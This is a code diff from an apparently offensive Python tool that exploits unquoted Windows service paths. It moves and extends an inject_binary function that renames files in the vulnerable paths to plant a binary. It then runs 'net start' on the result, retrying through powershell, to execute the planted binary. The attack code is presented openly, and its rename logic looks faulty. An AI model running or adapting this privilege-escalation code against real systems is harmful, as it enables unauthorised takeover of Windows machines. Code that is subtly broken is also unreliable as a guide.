@@ -29,20 +29,6 @@ def parseArgs():
         return args.b
     else: #if user did not enter a commandline argument
         raise Exception("No argument supplied")
-"""
-Method that injects binary/binaries into spaces in vulnerable path
-"""
-def inject_binary(vuln_files,binary):
-    for file in vuln_files:
-        print('Vulnerable file: ',file)
-        answer = input('Would you like to inject binary into this file? (y/n)')
-        if answer == 'y' or answer == 'Y' or answer == 'yes':
-            try:
-                new_path = file.replace(' ',binary) #replace all spaces in file with binary
-                os.rename(file,new_path)
-            except:
-                print('Could not inject binary into file: ',file)
-                continue
 
 """
 Method gets files that are vulnerable and stores them in dict
@@ -86,6 +72,29 @@ def look_for_files():
         end = file_path_to_marker.get(key)[1]
         vuln_files.add(key[start:end]) #add vulnerable file path to set
     return vuln_files
+
+"""
+Method that injects binary/binaries into spaces in vulnerable path
+"""
+def inject_binary(vuln_files,binary):
+    for file in vuln_files:
+        print('Vulnerable file: ',file)
+        answer = input('Would you like to inject binary into this file? (y/n)')
+        if answer == 'y' or answer == 'Y' or answer == 'yes':
+            try:
+                new_path = file.replace(' ',binary) #replace all spaces in file with binary
+                os.rename(file,new_path)
+                try:
+                    os.system('net start ' + new_path) #restart service to execute binary
+                except:
+                    try:
+                        #if service did not get restarted will try again with powershell
+                        os.system('C:\Windows\System32\WindowsPowerShell\\v1.0\\powershell.exe net start ' + new_path)
+                    except:
+                        pass
+            except:
+                print('Could not inject binary into file: ',file)
+                continue
 
 """
 Main method that handles logic
